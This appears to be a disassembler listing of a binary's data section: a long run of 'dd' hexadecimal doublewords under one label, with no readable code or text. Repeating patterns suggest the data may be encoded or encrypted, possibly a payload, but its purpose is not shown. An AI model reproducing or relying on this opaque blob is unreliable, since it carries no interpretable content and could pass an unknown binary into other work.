		dd 8BE17600h, 745183BBh, 12155CA9h, 8B1002FCh, 0E9C46CEBh
		dd 6AED4264h, 33FF88C0h, 0F9FD6C3Dh, 0A73D95E0h, 0E06CA05Eh
		dd 76C3B4FFh, 77E5E2Ah,	0D818A004h, 0D95B2FE6h,	0EC3D8311h
		dd 33B2A3C3h, 6DC3B43Dh, 7F6D907Fh, 907F6D90h, 0D95C64AEh
		dd 64AB55E7h, 8BB8D16Bh, 0B68BD3AEh, 83BE8B9Bh,	4B642C2Bh
		dd 70D0C4D1h, 11072963h, 0C1D402FFh, 868B9E8Fh,	64308BD7h
		dd 2FDB70C1h, 0E02063Ch, 6C358B4Ah, 0A41CFEE1h,	76709C76h
		dd 0AC766CA4h, 2B1AD65Ch, 8D736630h, 66B17364h,	4B64914Bh
		dd 74C5C4B9h, 0E3705CACh, 2067E71h, 76662FCEh, 9D383BEEh
		dd 0EB2AD604h, 0B3C0DCFFh, 9AFC8989h, 40AC76E8h, 0F18D1A76h
		dd 0ED148387h, 8B893D33h, 8FC5D4FCh, 4382BEBh, 4E2FCE02h
		dd 8801669Bh, 64280307h, 4A77603h, 790F2678h, 0EFFD000Dh
		dd 8B9BB68Bh, 7652838Eh, 21FE38BCh, 50BE3703h, 0FD003815h
		dd 9BB68BEFh, 3E33983h,	74F16435h, 117E74A4h, 8BCB8F03h
		dd 0BE8B83AEh, 0B7B68BD7h, 33EDC18Dh, 7407653Dh, 0F2E48ACh
		dd 4F653433h, 76C1DCFCh, 2EDE54A4h, 81A7BE89h, 0FD01E903h
		dd 64F073EFh, 4AD7613h,	780F2F78h, 1002FFE8h, 162F568Bh
		dd 0BE8BEFFDh, 9C153BD3h, 6CBC7675h, 173B39FEh,	2DD6359Ch
		dd 0FE6E0D8Bh, 0FD00EEFFh, 0ED430599h, 8BEFFD01h, 338BD786h
		dd 2FCEE964h, 0E92E0703h, 76AB1CFFh, 0EC1C8322h, 0AA1C0F03h
		dd 0EBC05C74h, 0B1A200EFh, 8D2CA65Dh, 0FD01ED77h, 9C143BEFh
		dd 2B3AD62Dh, 0FFC26E38h, 0D4FD00EEh, 8BED8BD0h, 0C57B642Dh
		dd 1E76CA64h, 0FDEC3D33h, 0E02063Ch, 6C338B44h,	0AA1CFEE1h
		dd 0EBC07CFCh, 0B1A200EFh, 902CA65Dh, 6D907F6Dh, 0E3D94C64h
		dd 24B37653h, 0BE8BBAF5h, 0D4158BEBh, 8BED8BE9h, 88ED6A14h
		dd 2FCE5DEAh, 0C5C43E5Bh, 7604AC74h, 0AF761CACh, 1177E18h
		dd 0F68BE088h, 0BACD5364h, 0E507AF51h, 1600EFEBh, 0ED0583FDh
		dd 364EE75h, 0A830A476h, 0AE1551BFh, 83EFFD19h,	0BE89E339h
		dd 0B9308BDFh, 0D164CE8Bh, 0D97C64AAh, 0ED14C1F7h, 0CA6458F3h
		dd 0E030E7Eh, 0E7BE8B4Bh, 0C5ECF68Bh, 0BE8922FEh, 2A765FE7h
		dd 5DE4745Eh, 6D902CA6h, 7F6D907Fh, 907F6D90h, 6D907F6Dh
		dd 0B37653BEh, 8BB9ED24h, 0AA10CB89h, 0D2894664h, 0EFFC06h
		dd 1556CC8Eh, 1002FD2Bh, 839BBB8Bh, 0FB3DEB39h,	9CFD00EEh
		dd 0F347808h, 0FD03EE79h, 0E03D85EFh, 0ED6884h,	0FEF86CFDh
		dd 0A976739Dh, 58A17648h, 766CB976h, 0F2E3891h,	4C653433h
		dd 838BEDEAh, 643C33BBh, 0C7CCB94Eh, 0DE349176h, 0AFAB8B15h
		dd 66A7BB89h, 9B41EB76h, 64870466h, 5664914Eh, 838B89C9h
		dd 64372383h, 0C0DCBD56h, 0B704649Bh, 64B54E64h, 0C06AB956h
		dd 0B73C669Bh, 0A1761F9Bh, 2CB9766Ch, 178127D6h, 0EFFD01E9h
		dd 0D98373Bh, 68E8B9ADh, 6CFD00EDh, 4666F5C4h, 9D46649Dh
		dd 0E0FEF86Ch, 0EEAA82h, 5D9664FDh, 64FD00F9h, 0F959BEh
		dd 9BC865FDh, 89914664h, 809FBB2Bh, 0B188EC14h,	669B14CBh
		dd 9664AA04h, 0FD00F965h, 0F95DBE64h, 0FFEAFD00h, 7500EF02h
		dd 79763AE3h, 0EFEBA0h,	0E924A376h, 4F6B89ADh, 81EFFD16h
		dd 0FD00101Ch, 652F33EFh, 1775191h, 79FF89EDh, 0EFF99879h
		dd 0D29B00h, 6B8C62FCh,	0EFFD0477h, 0FFCAEC73h,	0CE00EF02h
		dd 43758A26h, 8BFFFC96h, 0D812043Ch, 0EFFDFF10h, 33E815C1h
		dd 5190652Fh, 64ED0178h, 84109BC2h, 0FD09677Bh,	737B8BEFh
		dd 8BEFFD16h, 0FD164F6Bh, 26CE48EFh, 46642D3Bh,	7D96649Dh
		dd 0E0FD00EFh, 0F9643C94h, 0D674A176h, 663F3B27h, 6798894Eh
		dd 8F03167Eh, 0A974488Dh, 6CB97660h, 7638A976h,	0DCBF48B1h
		dd 6CB974C9h, 0FF02A377h, 0A176C164h, 8B0C2E58h, 3E33BBB3h
		dd 0CCC95E64h, 44A176C1h, 0AB8B35DEh, 0A7BB89AFh, 41EB7666h
		dd 0A704669Bh, 64B54E64h, 8B89B956h, 746683BBh,	0A9764AEBh
		dd 4666B560h, 76B29A9Dh, 0B3766CA9h, 89AFE524h,	5EE983BBh
		dd 64FD00EFh, 5664914Eh, 0CEC8ECC5h, 662C032Fh,	4E64914Eh
		dd 9D4628A5h, 0EFFD00EFh, 4666FF8Ah, 0CEE03CB5h, 0EEB78A26h
		dd 4E643C33h, 74C1CCA9h, 9D1648A9h, 8B83AB8Bh, 738BD7BBh
		dd 0EFFD164Fh, 8BEDF98Ah, 0FD164B6Bh, 0CBB988EFh, 4289B0Ch
		dd 7600EFB7h, 0EFEB9861h, 0A0797600h, 7500EFEBh, 0AB7611EBh
		dd 0BE64F124h, 0FD00F95Dh, 0EFFDFFCAh, 0D2DCBA00h, 69866B70h
		dd 66FD00EFh, 0F95DBEh,	0FDFF89FDh, 0F9618E64h,	0BE64FD00h
		dd 0FD00F95Dh, 0A6914664h, 4E64043Bh, 3F94E089h, 157640A6h
		dd 899BB389h, 28583BBh,	128384E0h, 4E6402FFh, 81C96AA1h
		dd 0D7AB8BE6h, 0C2EC3C8Bh, 3D33ED16h, 85915664h, 523ED600h
		dd 0ACE8B9ADh, 64FD00F2h, 6CA9760Eh, 0A14666ACh, 100AE307h
		dd 83F976FFh, 0BF8BFB39h, 9B3D85FFh, 0FDD11469h, 0B38B1002h
		dd 933485B3h, 38A97607h, 0FFEB2EFEh, 3DCEC0DCh,	0FEB0683h
		dd 76522D69h, 3ED66CB9h, 0E8B9AD52h, 0FD00F2F1h, 0A9760E64h
		dd 4666AC6Ch, 0A9E07A1h, 0F976FF10h, 8BFB3983h,	3D85FFBFh
		dd 2FCE119Ah, 0FEB0683h, 0A2482F68h, 0ED1D83B1h, 8B2CA45Bh
		dd 1583B03Eh, 370A5EEBh, 24B43D1Bh, 0FEC06C03h,	0B1A2C3B6h
		dd 59B43D33h, 6D907F3Eh, 7F6D907Fh, 53FB1183h, 7657B9A8h
		dd 64D52493h, 4764D177h, 91576481h, 64C54F64h, 4466856Fh
		dd 7A8BFBD9h, 0EFFD007Fh, 0FE15638Dh, 37031002h, 0AB74D3D4h
		dd 0E99E524h, 3F8139D6h, 0EFFD01E9h, 1CCBA989h,	0B9C7E716h
		dd 0EFFD1CCBh, 5465FD00h, 648D10D4h, 0EFFD01EDh, 28CBA988h
		dd 7529FB77h, 64EE24BBh, 0EF7197h, 8FEAD4FDh, 0CB91C1EAh
		dd 5764FF14h, 74C2D489h, 99DD24BBh, 24BB7404h, 0D97464E5h
		dd 0D7AA8BC3h, 13CBB98Ah, 0F93839FEh, 4A780FC5h, 8AEFFD00h
		dd 0C528CBB9h, 0E0022AABh, 0EF6A85h, 0C70265FDh, 62780FEEh
		dd 8AEFFD00h, 0C742EEBFh, 6AF201AEh, 0EFFD80h, 0BF022E7Eh
		dd 0AEFC4165h, 75EDC742h, 0FC4165BEh, 0EDC742AEh, 4165C775h
		dd 0C742AEFCh, 65CC75EDh, 42AEFC41h, 0D575EDC7h, 0AEFC4165h
		dd 75EDC742h, 0FC4165E2h, 0EDC742AEh, 4165EB75h, 0C742AEFCh
		dd 65F075EDh, 42AEFC41h, 0F975EDC7h, 5B8FCBD4h,	8B622C8Bh
		dd 2FF1103h, 2D7CD3C4h,	0EFFC02h, 0E17E3AC6h, 0F7D94464h
		dd 3B9F8A89h, 80EA642Dh, 0E5B98ADBh, 0AFB77FFh,	0D524AB75h
		dd 0FCD95467h, 8BDBAA8Bh, 2B23AFBAh, 649BF6DCh,	4464AD34h
		dd 0D3BF3D9h, 0AB760F99h, 89A7E924h, 0F214CBB9h, 1002246Ah
		dd 24AB76FFh, 8AE8D4DDh, 0B0388BEDh, 83B4A05Eh,	6DC3FB39h
		dd 0B9A853BEh, 14CB898Bh, 0FD0254AAh, 0A17600EFh, 6167C74h
		dd 8E00EFFCh, 0FE1556C7h, 8B1002F9h, 39839BB3h,	0E90481EBh
		dd 73EFFD01h, 0D94464F1h
dword_424F9C	dd 0E03D85F3h, 0EC0E84h, 0F2C96AFDh, 0EFFE206Bh, 832FCE00h
		dd 0AD72EC04h, 64B54664h, 5664A54Eh, 0C57E6491h, 26CEE03Ch
		dd 2F8B18Ah, 0DE349176h, 0AFAB8B15h, 4E643C33h,	76C1CCA9h
		dd 0A97444A1h, 4649B48h, 0F98989BCh, 83B38B95h,	8BDBBB8Bh
		dd 7666AFABh, 27DE6C91h, 8B893D33h, 0B38BA5F9h,	0ABAB8BA7h
		dd 4AD37466h, 7660A176h, 2F7870B9h, 8997B389h, 0A3898BABh
		dd 0D4B0748Fh, 0EF7D8Eh, 76459CFDh, 0A1766CB9h,	813FD62Ch
		dd 0FD01E914h, 982C3BEFh, 0E8B9AD33h, 2FF1239h,	6CF5C46Ch
		dd 4666F8F8h, 7E21989Dh, 0EFFD8851h, 159BFC00h,	8803177Eh
		dd 83AB8BFCh, 2B9FB38Bh, 0FDFA6E2Ch, 99FD00FFh,	60B17403h
		dd 7E78A976h, 6DF20317h, 0EFFC83h, 0F260A9C4h, 0EFFC7A68h
		dd 6CA97600h, 7674A176h, 0EFEBA079h, 0A4417600h, 7000EFEBh
		dd 65000893h, 2B89854Eh, 14808BBBh, 0CBB188ECh,	8989B518h
		dd 7600BAB9h, 0EFEB9879h, 0A0417600h, 0F800EFEBh, 0EFFDFF10h
		dd 8BC5F188h, 0FD164F6Bh, 0CBB18BEFh, 9666BF18h, 0FD00F95Dh
		dd 0EF02E16Eh, 0D2DCFD00h, 65AC7E77h, 109B10EEh, 4776B84h
		dd 0C066EFFDh, 637001EFh, 0EB6596h, 0D8119CFDh,	0EFFDFF10h
		dd 88653433h, 0ED017951h, 0FD16C164h, 100225h, 0FAE82EFDh
		dd 7F77D2DCh, 10EE6AACh, 2662D76h, 0E675866Bh, 8664FD00h
		dd 0FD00F961h, 0F95D9664h, 33A7FD00h, 76D0D434h, 0EE4778A9h
		dd 0FEFFD00h, 148B2E69h, 0C4894E64h, 8325FED0h,	0B389113Dh
		dd 97BB899Bh, 4183B38Bh, 0B3893E76h, 982A3B83h,	48A97641h
		dd 2E58A176h, 0D7B38B0Fh, 5C652633h, 0B38BEDECh, 643E33BBh
		dd 0C1CCC95Eh, 0DE44A176h, 0AFAB8B35h, 66A7BB89h, 9B41EB76h
		dd 64A70466h, 5664B54Eh, 0BB8B89B9h, 0EFFFBB83h, 8989FD00h
		dd 0BB8BA5F9h, 0A9744897h, 8B468878h, 0BBC783B3h, 0EFFD0087h
		dd 5E66BC00h, 74ED6A9Dh, 6BF26CA1h, 0FF1000C6h,	785CB976h
		dd 64FA7C3Dh, 0C2ECC546h, 3D33ED16h, 0EF97CAC4h, 0E8B9AD51h
		dd 0FD00F711h, 0A1761664h, 4E66AF6Ch, 0E7E07A1h, 0E976FF10h
		dd 8BFB3983h, 3485FFB5h, 0EE5784E0h, 8706FD00h,	76FF1000h
		dd 2F7868A9h, 5A790Fh, 0B38BEFFDh, 0D7AB8B83h, 0FFFEB98Ah
		dd 0EBA06176h, 797600EFh, 0EFEBA4h, 0ED24AB75h,	0A5F9C789h
		dd 8E64FD00h, 0FD00F965h, 0F95D9664h, 467FD00h,	5D8664ECh
		dd 0AFFD00F9h, 164F7B89h, 0B98BEFFDh, 10D810CBh, 66EFFD00h
		dd 69866B02h, 64FD00EFh, 0F9618Eh, 7B8462FDh, 0EFFD007Bh
		dd 0A061C449h, 8800EFEBh, 0B3B38BDDh, 9933485h,	7638B976h
		dd 43F032Eh, 8B2FCE02h,	0FD6A83ABh, 0BFAFD1C4h,	18D51556h
		dd 0F38BEFFDh, 0BE914664h, 0E8B3BB89h, 2FF1D31h, 64E9C46Ch
		dd 4E649156h, 7449AD89h, 0F9766CB9h, 8B9BB389h,	3D85FFBFh
		dd 0EF1784E0h, 0C706FD00h, 76FF1001h, 0A9766CA1h, 0C7A7BC74h
		dd 0FD0187BBh, 0A17400EFh, 74A9746Ch, 2FC4214h,	87BB8B10h
		dd 579B3D85h, 766CA976h, 797638A1h, 0EFEBA0h, 208AB77h
		dd 0F9598E64h, 4467FD00h, 3A66F7D9h, 0EFFD51EBh, 16776B8Bh
		dd 738BEFFDh, 0EFFD164Fh, 8BE5F988h, 7618CBA9h,	0EFEBA041h
		dd 0FF0D7C00h, 0B800EFFDh, 7B6B8462h, 89EFFD00h, 0FD164F53h
		dd 0EF0266EFh, 87BBC7h,	7600EFFDh, 26785CA1h, 4664FA7Ch
		dd 16C1ECC5h, 643D33EDh, 33F3D96Ch, 0F9FD6C2Fh,	0BD3F94E0h
		dd 2B83AB8Bh, 0AB50BD2Ch, 0EFEA6707h, 8BE17600h, 745183BBh
		dd 16155CA9h, 8B1002F1h, 0E9C46CEBh, 6AED4264h,	8BFC88C0h
		dd 7EC0DC08h, 0E0A20411h, 5EA73D95h, 0A65D2CDEh, 0AB76C3B6h
		dd 83B0E124h, 0A5EEB15h, 0B23D1B37h, 83B40324h,	3E59EC3Dh
		dd 0DCA05EB0h, 0C3B6A6C0h, 6D907F6Dh, 7F6D907Fh, 907F6D90h
		dd 0AB55BCACh, 0FBD97464h, 8B34CE57h, 819B93h, 0EFFD01EDh
		dd 0E8B9DB73h, 2FF1B29h, 6C896E64h, 0FD6EF9C4h,	0FD00EEFFh
		dd 0B3C40A9Ch, 84E0E124h, 0FD00ED8Ch, 6BF2EBD4h, 0EFFCFDh
		dd 7403127Eh, 6DF260B1h, 0EFFD97h, 0C66CA976h, 637B0F2Ch
		dd 8BEFFD00h, 2F33D7B3h, 0DCFC3C62h, 0FFA077C9h, 0BDFFA870h
		dd 25C61065h, 33AF8875h, 0C610652Fh, 0AF917525h, 10652F33h
		dd 9E7525C6h, 0EEFFC76Eh, 33AFFD00h, 0C610652Fh, 0AFBE7525h
		dd 10652F33h, 0C77525C6h, 652F33AFh, 7525C610h,	2F33AFCCh
		dd 25C61065h, 33AFD575h, 0C610652Fh, 0AFE27525h, 10652F33h
		dd 0EB7525C6h, 652F33AFh, 7525C610h, 2F33AFF0h,	25C61065h
		dd 0C7D4F975h, 3A2B5B8Fh, 0EFFC02EAh, 892AC600h, 0FE768FBBh
		dd 649D6E66h, 0F86C9D46h, 6682E0FEh, 64FD00EFh,	0F95D8Eh
		dd 599664FDh, 0C3FD00F9h, 4289B03h, 7600EEB7h, 0EFEB9861h
		dd 0A0797600h, 7500EFEBh, 67E524ABh, 9664EC04h,	0FD00F95Dh
		dd 0F7D94464h, 10D842h,	3433EFFDh, 0F95D9666h, 8865FD00h
		dd 0ED017751h, 6179FF89h, 0EFF998h, 6BACFA76h, 6B7010EEh
		dd 0EB658Eh, 2E26EFDh, 89FD00EFh, 887979FFh, 7600EFF4h
		dd 0EFEBA041h, 966B7000h, 0FD00E675h, 64897E64h, 0F96186h
		dd 915664FDh, 0D43433A7h, 60A976E8h, 0D6C17BF2h, 662D0317h
		dd 5666897Eh, 9D5E6691h, 0A1767004h, 6CB97638h,	7611EB77h
		dd 0EFEBA061h, 0A4797600h, 7500EFEBh, 89ED24ABh, 8BA5E189h
		dd 0FD167773h, 4F6B8BEFh, 88EFFD16h, 0B98BFEF9h, 517610CBh
		dd 0EFEBA0h, 0FD0010D8h, 3DCE47EFh, 9469798Dh, 7400EFFDh
		dd 0EFEBA051h, 109B00h,	0EB9C6176h, 517600EFh, 0EFEBA0h
		dd 914664B4h, 7BF2F9D4h, 8B2576C2h, 0BD4A9BABh,	66895666h
		dd 0CBD49146h, 30D6BF2h, 0A176FF10h, 7C24C65Ch,	0C54664FAh
		dd 0ED16C1ECh, 56643D33h, 2C2BBC91h, 7AB50BDh, 0EFE9F4h
		dd 0BB8BE176h, 0A9745183h, 0EF69155Ch, 0EB8B1002h, 0D6E9C46Ch
		dd 719BED5Ah, 2FD3D14h,	0B3B38B10h, 793363Bh, 0FE38A976h
		dd 0DCFFEB2Eh, 248376C0h, 7ED2DCE1h, 7BF20412h,	5664AFC2h
		dd 0AFD1C491h, 421556BFh, 8BEFFD14h, 914664F3h,	0B3BB89BEh
		dd 0FF00C2E8h, 7E166402h, 0B5C4142Bh, 8BFB8810h, 7EC0DC08h
		dd 0E0A20411h, 5EA73D95h, 0FFE06CA0h, 643E59B4h, 5FF3D944h
		dd 0A304077Eh, 2FE6D818h, 5B11D95Dh, 0A4032F7Eh, 0B2A35F2Ch
		dd 59B43D33h, 6D907F3Eh, 0CB898BB9h, 4664AA08h,	88C06A89h
		dd 0C21556FBh, 8B1002F2h, 39839BBBh, 0E03D85EBh, 0EF4684h
		dd 914664FDh, 64C54E64h, 0F95D96h, 9D4628FDh, 0EFFD00EFh
		dd 8BE7F98Ah, 0FD164B73h, 0CBB988EFh, 4289B0Ch,	7600EFACh
		dd 0EFEB9879h, 0A0617600h, 7500EFEBh, 69760AEBh, 0EFEBA0h
		dd 0F124BB76h, 101F81AFh, 89EFFD00h, 0FD164F7Bh, 6B0266EFh
		dd 0EF6996h, 894E64FDh,	7B6B8462h, 8BEFFD00h, 0FD164F6Bh
		dd 83BB8BEFh, 74A17449h, 0EB9C6176h, 0A6BD00EFh, 46662C3Bh
		dd 9A85E091h, 6402FF10h, 0D26AA156h, 838BE681h,	0EC378BD7h
		dd 33ED16CFh, 97C2C434h, 0B9AC50EFh, 0FC5EE8h, 760664FDh
		dd 66AD6CB9h, 3507A156h, 76FF1013h, 0FB3983E1h,	85FFBC8Bh
		dd 146D9B3Dh, 1002FFC5h, 10CB818Bh, 9D741078h, 6AA14E64h
		dd 8BE881C9h, 3C03D7BBh, 2FCE0204h, 0FF6C2F33h,	3F94E0F9h
		dd 83AB8BBDh, 50BD2C2Bh, 0EE5607ABh, 0E17600EFh, 5183BB8Bh
		dd 155CA974h, 1002ED07h, 0C46CEB8Bh, 0ED4264E9h, 0E088C06Ah
		dd 0FF6C3D33h, 3D95E0F9h, 0F7E5FA7h, 8B2CA302h,	1583B03Ah
		dd 370A5EEBh, 0FECB3D1Bh
		dd 3E032F7Eh, 0B13D33B0h, 907F6DC3h, 6D907F6Dh,	0E7D94464h
		dd 24AB520Fh, 0E8FFBFF1h, 0FFFC6213h, 0C3EB3983h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 0F524AB76h, 1BE8FFBFh,	59FFFC62h
		dd 6D907F3Eh, 64B9EC6Ch, 53A7D944h, 0AD24B376h,	64ED8BBAh
		dd 6864F948h, 7656A5E1h, 0AF760C9Fh, 11A37010h,	0D94C6606h
		dd 0A1358BC3h, 0CEEC362Bh, 703CB276h, 1102306Bh, 4C6602FFh
		dd 0B08BAFD9h, 0CBB989C7h, 2CAA7630h, 0D924A374h, 66CD4D64h
		dd 8BABD944h, 0B189DBB8h, 0A27618CBh, 24AB744Ch, 0AD4564D5h
		dd 0F3D94C66h, 89BBB08Bh, 4520CBB9h, 0EFFD00EEh, 8B0F2E57h
		dd 808BB7B0h, 0CB9189D7h, 24BB7414h, 0B989A7EDh, 0EE4538CBh
		dd 0D3EFFD00h, 0B989A71Dh, 147E3CCBh, 42CA8E0Fh, 0F78A26CEh
		dd 2476C164h, 0C36C1DD3h, 77C9DCF5h, 17FE01A5h,	8B2E7642h
		dd 74E03C36h, 0ECED24BBh, 82C7EF8h, 0C524A376h,	0CFD94464h
		dd 4643223h, 0D9446675h, 0CBB18BA3h, 0FF0E7C4Dh, 2E00EFFDh
		dd 0CA242B00h, 0EFFDFFh, 0EDA8A389h, 0AF55549Ah, 3D4780Fh
		dd 0FCB9EFFDh, 66FD00EFh, 8BB3D94Ch, 0D9446435h, 641DD3B3h
		dd 81A1D94Ch, 0FDFF101Ch, 28DE48EFh, 4C643C03h,	0F98BCFD9h
		dd 0CBB9896Eh, 24A3764Ch, 2E16EB0h, 3CFD00EFh, 2536D6EFh
		dd 0FD00EF02h, 0AB77B49Ah, 88A9B324h, 0FFBA06FBh, 0A37600EFh
		dd 0E16EB324h, 0FD001002h, 66F2E06Ch, 74B3D94Ch, 8ED8D4C5h
		dd 26CE42FBh, 10CBA989h, 148BE577h, 0A2ECB64h, 0C36C0003h
		dd 0FD0152F5h, 277600EFh, 4C6418D3h, 0DE4DB3D9h, 64300300h
		dd 89FBD96Ch, 765CCBB1h, 0C412D327h, 0F147ED8h,	0CE42CC8Eh
		dd 6C368B2Fh, 265F5C3h,	34330F2Eh, 0ECFC4A65h, 0C164BFF8h
		dd 1DD32476h, 0FFD95466h, 0C36C0503h, 0D94C64F5h, 0CBB98BD3h
		dd 8B20DE24h, 0B98967F9h, 0A3764CCBh, 0E16EB024h, 0FD00EF02h
		dd 0EFFDFFCAh, 2B002E00h, 88104724h, 0E0BDA8A5h, 0EDC285h
		dd 0FD0156FDh, 0A37400EFh, 0C864E524h, 0E524AB76h, 0A376E03Ch
		dd 0E16EB324h, 0FD001002h, 0EC3A23A7h, 24A376C1h, 7C0464D9h
		dd 0A3D94466h, 4DCBB18Bh, 0FDFF0E7Ch, 10D800EFh, 0D3EFFD00h
		dd 55D9C412h, 644B74FFh, 83A1D94Ch, 1C81E01Dh, 0EFFDFF10h
		dd 4C66253Bh, 0D173F7D9h, 663433ADh, 8AFFD954h,	76E964F7h
		dd 6C18D324h, 0FDECF5C3h, 0E97337C6h, 663433ADh, 8AFFD954h
		dd 76E964F7h, 0EC18D324h, 82C7EFDh, 0FD00EE40h,	3C358BEFh
		dd 4D37D6E5h, 308B00DEh, 0F7D96C64h, 0C8641403h, 0B18B002Eh
		dd 297644CBh, 6C663C2Bh, 153BF7D9h, 0EEDC86E0h,	0E8C4FD00h
		dd 0B524AB76h, 0FD8BE8D4h, 14CBB98Bh, 0E6C06776h, 267800EFh
		dd 1B4780Fh, 0B98BEFFDh, 0A7702CCBh, 24AB76FFh,	88C06AE1h
		dd 0CBB98BC9h, 32AD628h, 0D9446435h, 0E0153BB3h, 0EF7483h
		dd 74C5C4FDh, 65A124ABh, 46AEFC41h, 880667B0h, 0D492EB19h
		dd 2BA08EC5h, 0D944EC38h, 643503C7h, 2BF3D944h,	0D9446415h
		dd 9C153BB3h, 892AD65Dh, 775CCBB9h, 0A9BC01AEh,	75E9754Dh
		dd 0D94C640Bh, 0CBB98BC3h, 2483761Ch, 383BA6A1h, 7D63C9Ch
		dd 40CBB989h, 0A1248374h, 0AE77E864h, 4DA9BC01h, 0B75E975h
		dd 2AD61C04h, 44643503h, 153BB3D9h, 2AD6189Ch, 5CCBB989h
		dd 0BC01AE77h, 0E9754DA9h, 44640B75h, 338BF7D9h, 937EC8C4h
		dd 76EDA124h, 57AB57CFh, 8B0AAA45h, 0EA64A124h,	0AC8A022Ch
		dd 0AEBB41EEh, 165EB88h, 0FB88AEBBh, 67BB1165h,	24BB7616h
		dd 0FEEA6CA1h, 0CBA989A2h, 8B30885Ch, 7610CBA9h, 6AA124ABh
		dd 8AB689C0h, 0BB41EEBCh, 0AB760667h, 0F86CA124h, 774999FCh
		dd 67BB01A6h, 8BAE160Eh, 77C5C43Bh, 0A9BD01A7h,	8AE17540h
		dd 7540A9F5h, 0A9F58AE1h, 4C64F388h, 1483B3D9h,	0ED0483ECh
		dd 5CCBB189h, 3485328Ah, 0A777169Bh, 88A9BD01h,	0D94C64F3h
		dd 0EE0483B3h, 4065FB76h, 0FB88A9FCh, 0FBD96C64h, 30CBA93Bh
		dd 893BA18Eh, 0A78E34CBh, 0FF1370E9h, 0D94C6402h, 0CB918BB7h
		dd 18AE3A14h, 0ED013009h, 0EFE00028h, 2C04FD00h, 0A524AB76h
		dd 0FBE54028h, 0EBFFFCE0h, 892047E5h, 0EFB8C7E6h, 0EFFD0Bh
		dd 0B18BFD16h, 0AE3A58CBh, 10FD118h, 0FD4528EDh, 0EFFD00F2h
		dd 0E82E3E8Bh, 3CD0C4FEh, 37D6030Fh, 0EFFCB8h, 2ECB64FDh
		dd 0CBB18B0Fh, 0F8CCB558h, 7401AD70h, 0EEBB8DEEh, 8BE3BC89h
		dd 0D630CBB9h, 0EA3D832Dh, 8BEBBC89h, 0D634CBB9h, 0EEFC0529h
		dd 4166FD00h, 0C57D66EDh, 0D3A089B0h, 83B4A05Eh, 6DC3AB39h
		dd 7F6D907Fh, 907F6D90h, 0F124BB76h, 5681EC6Ch,	0EFFD08h
		dd 0A8532FCEh, 937057B9h, 0D26AB124h, 0E676440Eh, 7BD98C64h
		dd 33EFFD00h, 0FC8B893Dh, 89FFC16Ch, 4CABB9FFh,	0B144AB70h
		dd 641175A5h, 4FD9BCh, 0F2BEEFFDh, 66FD00EFh, 8DCFD974h
		dd 766ACBB9h, 0CBB189E0h, 386C9B14h, 0B3099AFDh, 6CFFE86Ch
		dd 0F19CFCFEh, 898921C6h, 0E98B20CBh, 14CB8989h, 0B852176h
		dd 6B763E9Ah, 0EF6124h,	0D94429FDh, 0AB3B40FFh,	66EEEC24h
		dd 0EF249B74h, 0A3761064h, 0A66ED24h, 3F83FF76h, 66ED89EBh
		dd 83E7760Ah, 0F589EB3Ch, 0EFFC0728h, 5EB0FD00h, 0A6C0DCA0h
		dd 2C81C46Ch, 0EFFCBBh,	8BF3D4FDh, 0CBB98DFDh, 386C9B4Eh
		dd 0BE089AFDh, 0D4FFC06Ch, 3B1D8FDEh, 74069C36h, 64E924B3h
		dd 0EE42CBh, 0A98DEFFDh, 28764ECBh, 0FFEC1033h,	0D62A649Bh
		dd 0AFE07812h, 83ED3F83h, 1176E005h, 15C6D2DCh,	94D6E47Eh
		dd 0FD007FD9h, 6CF874EFh, 0B9BFCFEh, 7E5DB1A2h,	6CA6FF27h
		dd 662C81C4h, 9324BB74h, 649BC0DCh, 66A1F974h, 93049BFEh
		dd 6CFFC06Ch, 8989E1F8h, 816EEB89h, 0CB798B06h,	0EFFD98h
		dd 59245376h, 0D4FD00EFh, 8BD38BC2h, 0FD94CB49h, 649B00EFh
		dd 0C06A9B06h, 225F189h, 0DCFD0010h, 6C649BEDh,	3D3383B9h
		dd 80E98989h, 66E97666h, 9144AB02h, 83B94462h, 98CB798Bh
		dd 0BF00EFFDh, 0D4FFC66Ch, 8B248FD0h, 0FD90CB79h, 104700EFh
		dd 831002FFh, 0C274EF15h, 28EB74A7h, 0E8DFD944h, 3A10EE92h
		dd 0C7D124ABh, 89FFFC70h, 1628CBA9h, 8095B8D9h,	4428ED01h
		dd 0FC00C7D9h, 0EDD000EFh, 89EFFD02h, 4530CBB9h, 0FFFC6F47h
		dd 0EDFF2Dh, 0D94466FDh, 66EDEBC3h, 89C3D97Ch, 3A30CB81h
		dd 0FCD524ABh, 8BEFFD00h, 0FD9CCB79h, 2CE00EFh,	18CB9189h
		dd 0C924BB74h, 0AB740064h, 157E124h, 2E00EFFDh,	0CBB9890Fh
		dd 24AB743Ch, 24862C5h,	0AFD94C66h, 90CB718Bh, 7E00EFFDh
		dd 0E2880116h, 0ECA93Dh, 6983E0FDh, 4FD00EDh, 2167E10h
		dd 0AD3DE488h, 0E0FD00EDh, 0ED7F83h, 0D97C66FDh, 0CBA98BCBh
		dd 24A37618h, 0D97464D9h, 893E8AC7h, 0C2C5F48Bh, 0EC24AB75h
		dd 10D8C164h, 3BEFFDFFh, 3B0C923Bh, 0EFED24ABh,	24A37466h
		dd 832804EFh, 0CBB18BF5h, 41E3772Ch, 0ED24A375h, 0DFD94C64h
		dd 41EB7666h, 0D944669Bh, 29F1EBFDh, 60FFD944h,	0D944289Bh
		dd 64FD00FDh, 24AB76CBh, 47CAC4C1h, 0EFFD00EEh,	4C641FD3h
		dd 8BF7D9h, 0A376EF3Ch,	4466E124h, 0C98DABD9h, 0EFFD007Ah
		dd 8D17FE00h, 818B56F1h, 2DD610CBh, 0C06A332Bh,	0B75D674h
		dd 57024B62h, 0EFFD01h,	38850F2Eh, 72C069Bh, 0FA9A3885h
		dd 3B3B19CEh, 0BF700B9Bh, 33ADEFFh, 16EA642Dh, 641033EDh
		dd 83CBD954h, 266ED3Fh,	89B15CA3h, 4CB38939h, 0D924BB74h
		dd 0B3C61E9Ah, 84E0DD24h, 0FD00EF00h, 7B76CA64h, 0EF6924h
		dd 0CEC0DCFDh, 0EE766634h
		dd 42F37666h, 0E924B3C6h, 10F686E0h, 746402FFh,	0B98BAFD9h
		dd 1ADE34CBh, 74660D3Bh, 790FA7D9h, 1002FE1Ah, 18CBA98Bh
		dd 0F7753D78h, 0FBD94464h, 18CBB989h, 0B18B3F76h, 0AB761CCBh
		dd 7C64B924h, 0F18DCFD9h, 0EFFCB86Eh, 4C66FD00h, 368BF3D9h
		dd 3EFECAC4h, 0D7D41DD3h, 898DCD8Eh, 10CE4CBBh,	2BD17666h
